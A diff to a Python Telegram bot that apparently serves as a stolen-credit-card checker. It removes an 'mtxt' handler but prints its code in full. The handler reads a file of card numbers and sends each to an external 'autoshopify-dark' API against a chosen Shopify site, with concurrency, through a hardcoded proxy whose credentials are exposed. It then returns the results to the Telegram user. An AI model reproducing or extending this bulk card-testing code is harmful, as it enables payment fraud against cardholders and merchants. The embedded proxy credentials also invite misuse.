@@ -4682,119 +4682,6 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-import aiohttp
-import asyncio
-import os
-from telegram import Update, InputFile
-from telegram.ext import ContextTypes
-from db import get_user
-
-PROXY = "198.23.239.134:6540:skgbsgwl:7y2hll5e4ycn"
-DOWNLOAD_FOLDER = "./downloads"
-os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
-
-
-# ---------------- Background card processing ---------------- #
-async def process_cards(update: Update, file_path: str, file_name: str, site: str):
-    output_file_path = os.path.join(DOWNLOAD_FOLDER, f"results_{file_name}")
-
-    # Always start with a clean empty file
-    open(output_file_path, "w", encoding="utf-8").close()
-
-    async with aiohttp.ClientSession() as session:
-        with open(file_path, "r", encoding="utf-8") as f:
-            cards = [line.strip() for line in f if line.strip()]
-
-        if not cards:
-            await update.message.reply_text("⚠️ The file is empty.")
-            return
-
-        sem = asyncio.Semaphore(5)
-        lock = asyncio.Lock()
-
-        async def check_card(card: str):
-            async with sem:
-                api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}&proxy={PROXY}"
-                print(f"🔎 Checking: {card}")
-
-                response_text = "No Response"
-                try:
-                    async with session.get(api_url, timeout=30) as resp:
-                        try:
-                            data = await resp.json(content_type=None)
-                            response_text = data.get("Response", "No Response")
-                        except Exception:
-                            text = await resp.text()
-                            response_text = f"Invalid JSON: {text[:120]}"
-                except Exception as e:
-                    response_text = f"Request Error: {e}"
-
-                line = f"{card} => {response_text}\n"
-                print("📝 Writing line:", line)
-
-                async with lock:
-                    with open(output_file_path, "a", encoding="utf-8") as out:
-                        out.write(line)
-
-        await asyncio.gather(*(check_card(card) for card in cards))
-
-    # Send only if file has real content
-    if os.path.exists(output_file_path) and os.path.getsize(output_file_path) > 0:
-        print("📄 Sending result file:", output_file_path)
-        await update.message.reply_document(
-            document=InputFile(output_file_path, filename=f"results_{file_name}")
-        )
-    else:
-        await update.message.reply_text("⚠️ Something went wrong, results empty.")
-
-    try:
-        os.remove(file_path)
-        os.remove(output_file_path)
-    except Exception as e:
-        print("⚠️ Cleanup error:", e)
-
-
-
-# ---------------- Unified handler ---------------- #
-async def mtxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_data = await get_user(user_id)
-
-    if not user_data or not user_data.get("custom_urls"):
-        await update.message.reply_text("⚠️ You have not added any site. Please add your custom site first.")
-        return
-
-    site = user_data["custom_urls"]
-
-    # Get document (direct or reply)
-    document = update.message.document
-    if not document and update.message.reply_to_message:
-        document = update.message.reply_to_message.document
-
-    if not document or not document.file_name.endswith(".txt"):
-        await update.message.reply_text("⚠️ Please send or reply to a .txt file containing cards.")
-        return
-
-    # Save uploaded file
-    file_path = os.path.join(DOWNLOAD_FOLDER, f"{update.message.message_id}_{document.file_name}")
-    file = await document.get_file()
-    await file.download_to_drive(file_path)
-
-    # Tell user processing started
-    await update.message.reply_text("✅ Processing started, please wait…")
-
-    # Run background task
-    asyncio.create_task(process_cards(update, file_path, document.file_name, site))
-
-
-
-
-
-
-
-
-
-
 # ===== Shopify check request =====
 import asyncio
 import httpx
@@ -6962,7 +6849,6 @@ def register_commands(application):
         ("gate", gate_command),
         ("fl", fl_command),
         ("status", status_command),
-        ("mtxt", mtxt_handler), 
         ("redeem", redeem_command)
 
     ]
